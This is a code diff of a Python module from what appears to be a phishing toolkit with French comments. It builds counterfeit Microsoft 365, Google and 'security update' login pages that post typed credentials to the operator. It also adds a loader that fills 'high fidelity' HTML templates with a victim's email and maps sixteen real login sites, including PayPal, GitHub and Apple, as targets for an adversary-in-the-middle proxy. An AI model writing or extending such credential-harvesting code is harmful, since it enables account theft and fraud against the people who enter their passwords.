@@ -1,5 +1,6 @@
+import os
 from abc import ABC, abstractmethod
-from typing import Dict, Optional
+from typing import Dict, Optional, List
 
 class PhishingTemplate(ABC):
     """
@@ -20,28 +21,48 @@ class PhishingTemplate(ABC):
         """URL cible réelle (pour le proxy AiTM)."""
         pass
 
+    def _load_html(self, filename: str) -> str:
+        """Charge le contenu HTML depuis le dossier templates haute fidélité."""
+        try:
+            # Chemin absolu basé sur la structure du projet
+            # On remonte de core/social/templates.py vers core/assets/templates/high_fidelity/
+            base_path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))) # Vantablack_Clean/
+            path = os.path.join(base_path, "core", "assets", "templates", "high_fidelity", filename)
+            
+            if not os.path.exists(path):
+                # Fallback vers l'ancien dossier si le nouveau n'existe pas
+                path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "html_templates", filename)
+                
+            with open(path, "r", encoding="utf-8") as f:
+                return f.read()
+        except Exception as e:
+            print(f"Error loading template {filename}: {e}")
+            return "<h1>Template Error</h1>"
+
+    def _apply_context(self, html: str, context: Dict[str, str] = None) -> str:
+        """Remplace les variables {{ key }} par les valeurs du contexte."""
+        if not context:
+            context = {}
+        
+        # Valeurs par défaut
+        if "email" not in context:
+            context["email"] = ""
+        if "company" not in context:
+            context["company"] = "Security"
+
+        for key, value in context.items():
+            if value is None: value = ""
+            html = html.replace(f"{{{{ {key} }}}}", str(value))
+            html = html.replace(f"{{{{{key}}}}}", str(value)) # Support sans espaces
+        return html
+
 class MicrosoftLoginTemplate(PhishingTemplate):
     def __init__(self):
         super().__init__("Microsoft 365", "Faux login Microsoft 365 pour capture d'identifiants.")
 
     def render(self, context: Dict[str, str] = None) -> str:
-        # Simplification: En prod, on chargerait un vrai fichier HTML
-        return """
-        <html>
-            <head><title>Sign in to your account</title></head>
-            <body style="font-family: 'Segoe UI', sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh;">
-                <div style="background: white; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 400px;">
-                    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
-                    <h2>Sign in</h2>
-                    <form action="/auth/login" method="POST">
-                        <input type="email" name="login" placeholder="Email, phone, or Skype" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc;">
-                        <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc;">
-                        <button type="submit" style="width: 100%; padding: 10px; background-color: #0067b8; color: white; border: none; cursor: pointer;">Next</button>
-                    </form>
-                </div>
-            </body>
-        </html>
-        """
+        html = self._load_html("microsoft.html")
+        return self._apply_context(html, context)
         
     @property
     def target_url(self) -> str:
@@ -52,23 +73,8 @@ class GoogleLoginTemplate(PhishingTemplate):
         super().__init__("Google Workspace", "Faux login Google pour capture d'identifiants.")
 
     def render(self, context: Dict[str, str] = None) -> str:
-        return """
-        <html>
-            <head><title>Sign in - Google Accounts</title></head>
-            <body style="font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
-                <div style="border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 450px; text-align: center;">
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="75" alt="Google">
-                    <h2>Sign in</h2>
-                    <p>to continue to Gmail</p>
-                    <form action="/auth/login" method="POST">
-                        <input type="email" name="email" placeholder="Email or phone" style="width: 100%; padding: 13px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px;">
-                        <input type="password" name="password" placeholder="Enter your password" style="width: 100%; padding: 13px; margin-bottom: 30px; border: 1px solid #dadce0; border-radius: 4px;">
-                        <button type="submit" style="background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold; cursor: pointer;">Next</button>
-                    </form>
-                </div>
-            </body>
-        </html>
-        """
+        html = self._load_html("google.html")
+        return self._apply_context(html, context)
 
     @property
     def target_url(self) -> str:
@@ -79,23 +85,76 @@ class GenericUpdateTemplate(PhishingTemplate):
         super().__init__("Generic Update", "Page de maintenance générique demandant une reconnexion.")
 
     def render(self, context: Dict[str, str] = None) -> str:
-        company = context.get("company", "Your Company") if context else "Your Company"
-        return f"""
-        <html>
-            <head><title>Security Update Required</title></head>
-            <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
-                <h1>{company} Security Update</h1>
-                <p>Your session has expired due to a mandatory security update.</p>
-                <p>Please re-authenticate to continue.</p>
-                <form action="/auth/login" method="POST">
-                    <input type="text" name="username" placeholder="Username">
-                    <input type="password" name="password" placeholder="Password">
-                    <button type="submit">Login</button>
-                </form>
-            </body>
-        </html>
-        """
+        html = self._load_html("generic.html")
+        return self._apply_context(html, context)
 
     @property
     def target_url(self) -> str:
         return "https://example.com" # Placeholder
+
+class DynamicPhishingTemplate(PhishingTemplate):
+    """
+    Template chargé dynamiquement depuis un fichier HTML.
+    """
+    def __init__(self, filename: str, target_url: str):
+        name = filename.replace(".html", "").capitalize()
+        super().__init__(name, f"Template généré pour {name}")
+        self.filename = filename
+        self._target_url = target_url
+
+    def render(self, context: Dict[str, str] = None) -> str:
+        html = self._load_html(self.filename)
+        return self._apply_context(html, context)
+
+    @property
+    def target_url(self) -> str:
+        return self._target_url
+
+class TemplateLoader:
+    """
+    Charge automatiquement les templates depuis le dossier assets.
+    """
+    
+    TARGET_URL_MAP = {
+        "amazon": "https://www.amazon.com/ap/signin",
+        "apple": "https://appleid.apple.com",
+        "discord": "https://discord.com/login",
+        "dropbox": "https://www.dropbox.com/login",
+        "facebook": "https://www.facebook.com/login",
+        "github": "https://github.com/login",
+        "google": "https://accounts.google.com",
+        "instagram": "https://www.instagram.com/accounts/login/",
+        "linkedin": "https://www.linkedin.com/login",
+        "microsoft": "https://login.microsoftonline.com",
+        "paypal": "https://www.paypal.com/signin",
+        "reddit": "https://www.reddit.com/login",
+        "slack": "https://slack.com/signin",
+        "tiktok": "https://www.tiktok.com/login",
+        "yahoo": "https://login.yahoo.com",
+        "teams_meeting": "https://teams.microsoft.com"
+    }
+    
+    @staticmethod
+    def load_all() -> Dict[str, PhishingTemplate]:
+        templates = {}
+        
+        # Base path to high_fidelity templates
+        base_path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        templates_dir = os.path.join(base_path, "core", "assets", "templates", "high_fidelity")
+        
+        if not os.path.exists(templates_dir):
+            return templates
+            
+        for filename in os.listdir(templates_dir):
+            if filename.endswith(".html"):
+                key = filename.replace(".html", "")
+                target_url = TemplateLoader.TARGET_URL_MAP.get(key, "https://example.com")
+                templates[key] = DynamicPhishingTemplate(filename, target_url)
+                
+        # Override with specialized classes if needed (though Dynamic handles them well now)
+        # We can keep specialized classes if they have custom logic beyond simple rendering
+        templates["microsoft"] = MicrosoftLoginTemplate()
+        templates["google"] = GoogleLoginTemplate()
+        templates["generic"] = GenericUpdateTemplate()
+        
+        return templates
